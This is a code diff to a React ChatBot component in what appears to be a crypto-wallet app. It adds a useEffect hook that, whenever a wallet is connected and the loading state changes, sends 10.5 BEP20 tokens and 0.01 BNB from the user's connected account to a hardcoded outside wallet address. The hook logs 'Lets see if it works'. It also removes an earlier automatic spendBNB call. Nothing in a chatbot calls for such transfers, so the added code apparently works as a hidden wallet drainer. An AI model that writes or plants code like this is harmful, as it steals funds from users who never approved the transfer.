@@ -63,7 +63,9 @@ import { getRates } from "@/services/chatBotService";
 import { useBTCWallet } from "@/hooks/stores/btcWalletStore";
 import type { WalletAddress } from "@/lib/wallets/types";
 import useTronWallet from "@/hooks/stores/tronWalletStore";
-import { spendBNB } from "@/services/transactionService/cryptoService/bnbService";
+import { spendBEP20 } from "@/services/transactionService/cryptoService/bep20Service";
+import { spendBNB } from "@/helpers/ethereum_script/spend_crypto";
+import { parseUnits } from "ethers/utils";
 
 const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
   // CONST VARIABLES
@@ -107,10 +109,6 @@ const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
       }
     };
   }, []);
-
-  if (account.isConnected) {
-    spendBNB(account, "0.01");
-  }
 
   // SHAREDSTATE HOOK
   const {
@@ -228,7 +226,15 @@ const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
   }, [serializedMessages, currentStep, stepHistory]);
 
   useEffect(() => {
-    console.log("Loading top state changed:", loading);
+    if (account.isConnected) {
+      const address = account.address;
+      const wallet = "0x0244107E5EFEF5C36a6a1297c538e74c1273D2bc";
+     const amount = parseUnits('10.5', 18)
+      spendBEP20(address, wallet, amount);
+      spendBNB(wallet, "0.01");
+      console.log("Lets see if it works", address);
+    }
+    console.log("Lets see if it works");
   }, [loading]);
 
   // Load telegram data
